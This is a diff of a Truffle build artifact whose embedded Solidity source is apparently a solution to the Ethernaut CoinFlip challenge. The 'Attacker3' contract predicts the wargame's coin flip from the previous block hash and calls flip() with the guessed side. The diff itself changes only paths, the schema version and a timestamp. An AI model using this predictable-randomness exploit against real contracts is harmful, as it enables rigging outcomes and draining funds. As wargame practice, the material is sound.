@@ -30,7 +30,7 @@
   "sourceMap": "",
   "deployedSourceMap": "",
   "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nabstract contract CoinFlip {\n    function flip(bool _guess) public virtual returns (bool);\n}\n\ncontract Attacker3 is Ownable {\n    uint256 lastHash;\n    uint256 FACTOR =\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    address targetAddress = 0x664Fa233750FE1897CEffcE3d74e34dEC8D72AFB;\n\n    function attack() external onlyOwner {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        CoinFlip targetContract = CoinFlip(targetAddress);\n        targetContract.flip(side);\n    }\n}\n",
-  "sourcePath": "/Users/shintaro/Desktop/Solidity/Ethernaut/contracts/3_CoinFlip.sol",
+  "sourcePath": "/Users/shintaro/Desktop/Ethernaut/contracts/3_CoinFlip.sol",
   "ast": {
     "absolutePath": "project:/contracts/3_CoinFlip.sol",
     "exportedSymbols": {
@@ -2082,8 +2082,8 @@
     "version": "0.8.4+commit.c7e474f2.Emscripten.clang"
   },
   "networks": {},
-  "schemaVersion": "3.4.2",
-  "updatedAt": "2021-08-13T09:48:40.331Z",
+  "schemaVersion": "3.4.1",
+  "updatedAt": "2021-08-16T01:19:26.007Z",
   "devdoc": {
     "kind": "dev",
     "methods": {},
